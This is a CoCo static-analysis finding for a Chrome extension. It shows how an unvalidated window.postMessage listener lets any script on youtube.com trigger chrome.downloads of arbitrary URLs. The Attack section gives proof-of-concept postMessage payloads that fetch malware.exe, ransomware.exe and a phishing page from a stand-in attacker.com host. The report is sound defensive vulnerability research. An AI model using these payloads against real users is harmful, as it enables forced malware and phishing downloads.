# CoCo Analysis: cdcnbghmopepcjhpcoeggggemedhmcgb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cdcnbghmopepcjhpcoeggggemedhmcgb/opgen_generated_files/cs_0.js
Line 473: `window.addEventListener("message",function(e){`
Line 478: `chrome.runtime.sendMessage({name:fn,url:e.data.url},function(res){`

**Code:**

```javascript
// Content script - Window message listener (cs_0.js line 473)
window.addEventListener("message", function(e) {
  console.log("download:", e);
  var ext = e.data.type.split("/")[1].split(";")[0];
  var fn = e.data.name + "." + ext;
  console.log(fn, chrome);
  chrome.runtime.sendMessage({
    name: fn,
    url: e.data.url // ← attacker-controlled URL
  }, function(res) {
    console.log(res);
  });
});

// Background script - Message handler (bg.js line 965)
chrome.runtime.onMessage.addListener(function(request, sender, callback) {
  console.log("received", request, sender, callback);

  chrome.downloads.download({
    url: request.url, // ← attacker-controlled URL from content script
    filename: "videoplayback.mp4" // ← SINK: arbitrary download
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// From youtube.com (where content script is injected)
// Attacker can inject this via XSS or control webpage content
window.postMessage({
    type: 'video/mp4;',
    name: 'malware',
    url: 'https://attacker.com/malware.exe'
}, '*');

// More sophisticated attack - download file disguised as video
window.postMessage({
    type: 'video/mp4;',
    name: 'important_video',
    url: 'https://attacker.com/ransomware.exe'
}, '*');

// Download phishing page as HTML
window.postMessage({
    type: 'text/html;',
    name: 'youtube_login',
    url: 'https://attacker.com/phishing.html'
}, '*');
```

**Impact:** Arbitrary file download vulnerability. Any webpage on youtube.com can trigger downloads of arbitrary files from any URL by sending a postMessage. While the extension only runs on youtube.com, an attacker who can execute JavaScript on youtube.com (via XSS, compromised ads, etc.) can force users to download malicious executables, malware, ransomware, or phishing content. The extension has the `downloads` permission and performs no validation on the URL or file type. The downloaded file is saved with a hardcoded name "videoplayback.mp4" which could be misleading to users.

---
